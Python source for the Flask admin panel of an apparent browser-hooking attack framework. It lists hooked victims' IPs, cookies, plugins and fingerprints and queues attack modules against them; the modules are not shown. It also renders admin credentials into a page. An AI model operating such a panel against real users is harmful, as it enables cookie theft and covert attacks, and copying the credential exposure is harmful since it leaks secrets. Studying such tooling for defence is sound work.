from flask import abort, request, redirect
from flask_admin import AdminIndexView, BaseView, expose
import os
from ..armory.parsers import Module
from ..command.models import Command
from ..hook.models import Hook
from ..helper.responses import OK_RESPONSE
from ..extensions import auth
from ..auth import AuthException, AuthModelView

class FishermanIndexView(AdminIndexView):
    """View for the admin index page."""
    
    def is_accessible(self):
        """Check if the user is authenticated."""
        if not auth.authenticate():
            raise AuthException('Not authenticated.')
        else:
            return True
    
    def inaccessible_callback(self, name, **kwargs):
        """Redirect users if they are not authenticated."""
        return redirect(auth.challenge())
    
    @expose('/')
    def index(self):
        """Render the index page."""
        return self.render('admin/index.html', username=os.environ['ADMIN_AUTH_USERNAME'], password=os.environ['ADMIN_AUTH_PASSWORD'])
    
class AttacksView(BaseView):
    """View for managing attacks."""
    
    def is_accessible(self):
        """Check if the user is authenticated."""
        if not auth.authenticate():
            raise AuthException('Not authenticated.')
        else:
            return True
    
    def inaccessible_callback(self, name, **kwargs):
        """Redirect users if they are not authenticated."""
        return redirect(auth.challenge())
    
    @expose('/')
    def index(self):
        """Render the attacks index page."""
        return self.render('admin/attacks_index.html', modules=Module.module_name_to_display_name) 

    @expose('/command', methods=['POST'])
    def command_update(self):
        """Update commands."""
        id = request.form.get('hook_id')
        module = request.form.get('module')

        if not id or not module:
            return abort(400)

        if not Module.has_value(module) or id not in [str(id_[0]) for id_ in Hook.query.with_entities(Hook.id).all()]:
            return abort(400)
        
        new_command = Command(
            hook_id=id,
            command=module
        )

        from ..extensions import db
        db.session.add(new_command)
        db.session.commit()
        return OK_RESPONSE
        
class CommandAdminView(AuthModelView):
    """View for managing commands."""
    
    column_list = ('hook_id', 'command')
    form_columns = ('hook_id', 'command')
    column_labels = {'hook_id': 'Hook ID'}

class HookAdminView(AuthModelView):
    """View for managing hooks."""
    
    column_list = ('id', 'ip_address', 'os', 'user_agent', 'screen_resolution', 'browser_plugins', 'cookies', 'language', 'timezone', 'last_update')
    column_labels = {
        'id': 'Hook ID',
        'ip_address' : 'IP Address',
        'os' : 'Operating System',
        'user_agent' : 'User Agent',
        'screen_resolution' : 'Screen Resolution',
        'browser_plugins' : 'Browser Plugins',
        'cookies' : 'Cookies',
        'language' : 'Language',
        'timezone' : 'Timezone',
        'last_update' : 'Last Update'
    }
